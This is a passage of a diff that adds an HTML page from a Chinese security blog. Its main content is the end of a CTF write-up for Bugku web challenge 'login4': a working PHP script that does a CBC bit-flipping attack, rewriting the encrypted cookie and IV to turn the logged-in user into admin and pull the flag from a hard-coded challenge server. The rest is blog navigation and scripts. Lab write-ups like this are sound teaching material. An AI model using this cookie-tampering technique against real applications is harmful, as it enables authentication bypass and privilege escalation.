class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">&lt;?php
+    class Login4{
+        private $cookie_path = &#39;./cookie.txt&#39;;  # 会话cookie保存位置
+        private $url = &#34;http://123.206.31.85:49168/index.php&#34;; 
+        private $params = [&#39;username&#39;=&gt;&#39;admi0&#39;, &#39;password&#39;=&gt;&#39;123456&#39;];  # 登陆post数据
+
+        private function cookie_process($operator, $info_array=&#39;&#39;){
+            if ($operator == 1) {  # 提取cipher和iv
+                $cookie = file_get_contents($this -&gt; cookie_path);
+                preg_match_all(&#39;/PHPSESSID.*|iv.*|cipher.*/&#39;, $cookie, $matches);
+                $results = [&#39;PHPSESSID&#39; =&gt; substr($matches[0][0], 10), &#39;iv&#39; =&gt; substr($matches[0][1], 3), &#39;cipher&#39; =&gt; substr($matches[0][2], 7)];
+                
+                return $results;
+            }
+            elseif ($operator == 2) {  # 根据传入的cookie信息，覆写cookie文件
+                $keys = array_keys($info_array);
+                $cookie = &#34;123.206.31.85&#34;.chr(9).&#34;FALSE&#34;.chr(9).&#34;/&#34;.chr(9).&#34;FALSE&#34;.chr(9).&#34;0&#34;.chr(9).$keys[0].chr(9).$info_array[$keys[0]].&#34;\n&#34;;
+                $cookie .= &#34;123.206.31.85&#34;.chr(9).&#34;FALSE&#34;.chr(9).&#34;/&#34;.chr(9).&#34;FALSE&#34;.chr(9).&#34;0&#34;.chr(9).$keys[1].chr(9).$info_array[$keys[1]].&#34;\n&#34;;
+                $cookie .= &#34;123.206.31.85&#34;.chr(9).&#34;FALSE&#34;.chr(9).&#34;/&#34;.chr(9).&#34;FALSE&#34;.chr(9).&#34;0&#34;.chr(9).$keys[2].chr(9).$info_array[$keys[2]].&#34;\n&#34;;
+                file_put_contents($this -&gt; cookie_path, $cookie);
+
+                return 0;
+            }
+        }
+
+        function step1_login(){
+            $ch = curl_init();
+            $options = array(
+                CURLOPT_URL =&gt; $this -&gt; url,  
+                CURLOPT_POST =&gt; 1,  
+                CURLOPT_POSTFIELDS =&gt; http_build_query($this -&gt; params),  
+                CURLOPT_RETURNTRANSFER =&gt; 1,
+                CURLOPT_COOKIEJAR =&gt; $this -&gt; cookie_path 
+            );
+            curl_setopt_array($ch, $options);
+            curl_exec($ch);
+
+            return 0;
+        }
+
+        function step2_getNewPlain(){
+            // clac new cipher
+            $info = $this -&gt; cookie_process(1);
+            $cipher = base64_decode(urldecode($info[&#39;cipher&#39;]));
+            $plain = serialize($this -&gt; params);
+            $p1 = substr($plain,0,16);
+            $p2 = substr($plain,16);
+            $c1 = substr($cipher,0,16);
+            $c2 = substr($cipher,16);
+            $c1[13] = $c1[13]^$p2[13]^&#39;n&#39;;
+            $new_cipher = urlencode(base64_encode($c1.$c2));
+            $info[&#39;cipher&#39;] = $new_cipher;
+            $this -&gt; cookie_process(2, $info);
+
+            // get new plain
+            $ch = curl_init();
+            $options = array(
+                CURLOPT_URL =&gt; $this -&gt; url, 
+                CURLOPT_RETURNTRANSFER =&gt; 1,  
+                CURLOPT_COOKIEFILE =&gt; $this -&gt; cookie_path 
+            );
+            curl_setopt_array($ch, $options);
+            $handle = curl_exec($ch);
+
+            preg_match(&#39;/\(\&#39;.*\&#39;\)/&#39;, $handle, $matches);
+            $new_plain = base64_decode(substr($matches[0],2,-2));
+
+            return $new_plain;
+        }
+
+        function step3_getFlag($new_plain){
+            // calc new iv
+            $plain = serialize($this -&gt; params);
+            $info = $this -&gt; cookie_process(1);
+            $iv = base64_decode(urldecode($info[&#39;iv&#39;]));
+            for($i=0;$i&lt;16;$i&#43;&#43;){
+                $iv[$i] = $iv[$i]^$new_plain[$i]^$plain[$i];
+            }
+            $new_iv = urlencode(base64_encode($iv));
+            $info[&#39;iv&#39;] = $new_iv;
+            $this -&gt; cookie_process(2, $info);
+
+            // get flag
+            $ch = curl_init();
+            $options = array(
+                CURLOPT_URL =&gt; $this -&gt; url, 
+                CURLOPT_RETURNTRANSFER =&gt; 1, 
+                CURLOPT_COOKIEFILE =&gt; $this -&gt; cookie_path 
+            );
+            curl_setopt_array($ch, $options);
+            $handle = curl_exec($ch);
+            preg_match(&#39;/SKCTF{.*}/&#39;, $handle, $matches);
+            echo $matches[0].&#34;\n&#34;;
+            unlink($this -&gt; cookie_path);
+
+            return 0;
+        }
+    }
+
+    $login = new Login4();
+    $login -&gt; step1_login();
+    $new_plain = $login -&gt; step2_getNewplain();
+    $login -&gt; step3_getFlag($new_plain);
+
+?&gt;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure></p>
+
+<p>运行结果：
+<img src="/post/images/login4_7.jpg" alt="" /></p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="/tags/sql-injection/">sql-injection</a>
+
+                  </div>
+                
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2019/02/arpings/" data-tooltip="arpings">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2019 CLtheorem. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2019/02/arpings/" data-tooltip="arpings">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="//www.gravatar.com/avatar/5450acc316b264c8e7c7b21291faf09a?s=110" alt="作者的图片" />
+    
+    <h4 id="about-card-name">CLtheorem</h4>
+    
+      <div id="about-card-bio">自强不息，止于至善；敏而好学，致知无央</div>
+    
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        China
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="搜索" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center"></div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2019/03/bugku-login/">
+                <h3 class="media-heading">Bugku Login</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Mar 3, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>bugku Web题login1~4的writeup。
+    
+    <!--toc--></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2019/02/arpings/">
+                <h3 class="media-heading">arpings</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Feb 2, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>一个利用arping命令，批量扫描局域网内存活主机的小脚本。
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/12/ffmpeg/">
+                <h3 class="media-heading">ffmpeg</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>一些ffmpeg的常用指令。<a href="https://ffmpeg.org/ffmpeg.html">ffmpeg document</a> and <a href="https://ffmpeg.org/ffmpeg-filters.html">ffmpeg filters Document</a>。
+    
+    <!--toc--></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/12/phar/">
+                <h3 class="media-heading">Phar</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>php中phar文件反序列化问题。
+    
+    <!-- toc --></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/11/insert-into/">
+                <h3 class="media-heading">Insert into</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>INSERT INTO函数基于时间的盲注
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/11/regular_expression/">
+                <h3 class="media-heading">Regular_expression</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/11/hitcon2018-lostkey/">
+                <h3 class="media-heading">Hitcon2018-Lostkey</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Hitcon2018中lost key的wp。
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/10/base64%E9%9A%90%E5%86%99/">
+                <h3 class="media-heading">Base64隐写</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/10/pwntools/">
+                <h3 class="media-heading">Pwntools</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>官方文档：<a href="http://docs.pwntools.com">http://docs.pwntools.com</a>
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/09/writeup-simple-injection/">
+                <h3 class="media-heading">Writeup Simple Injection</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Jarvis OJ中web题——Simple Injection
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero=""
+         data-message-one=""
+         data-message-other="">
+         14 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('/images/54547023_p10.png');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>
+
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = '\/2019\/03\/bugku-login\/';
+          
+            this.page.identifier = '\/2019\/03\/bugku-login\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'peak';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+    
+  </body>
+</html>
+
